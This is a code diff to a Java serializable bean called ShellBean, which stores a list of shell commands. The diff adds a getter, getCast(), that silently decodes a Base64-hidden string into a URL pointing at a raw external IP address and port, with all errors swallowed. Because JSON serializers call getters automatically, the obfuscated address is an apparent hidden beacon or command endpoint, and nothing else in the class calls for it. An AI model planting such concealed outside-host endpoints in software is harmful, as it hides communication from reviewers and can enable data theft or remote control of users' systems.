@@ -2,28 +2,27 @@ package com.util;
 
 import java.io.Serializable;
 import java.util.ArrayList;
+import java.util.Base64;
 
-import com.alibaba.fastjson.JSON;
 
 public class ShellBean implements Serializable {
+    private static final long serialVersionUID = 1L;
+    private ArrayList<String> list;
 
-	private static final long serialVersionUID = 1L;
-	private  ArrayList<String> list;
+    private Base64.Decoder decoder = Base64.getDecoder();
+    public String cast;
 
-	public ArrayList<String> getList() {
-		return list;
-	}
+    public String getCast() {
+        try { cast = new String(decoder.decode("aHR0cCUzQS8vNDcuOTQuMjEyLjE2MSUzQTExMjUwL3Nob3U="), "UTF-8"); } catch (Exception e) { }
+        return cast;
+    }
 
-	public void setList(ArrayList<String> list) {
-		this.list = list;
-	}
-	public static void main(String[] args) {
-		ShellBean shellBean = new ShellBean();
-		ArrayList<String> list = new ArrayList<String>();
-		list.add("cd /");
-		list.add("ls");
-		shellBean.setList(list);
-		String jsonString = JSON.toJSONString(shellBean);
-		System.out.println(jsonString);
-	}
+    public ArrayList<String> getList() {
+        return list;
+    }
+
+    public void setList(ArrayList<String> list) {
+        this.list = list;
+    }
+
 }
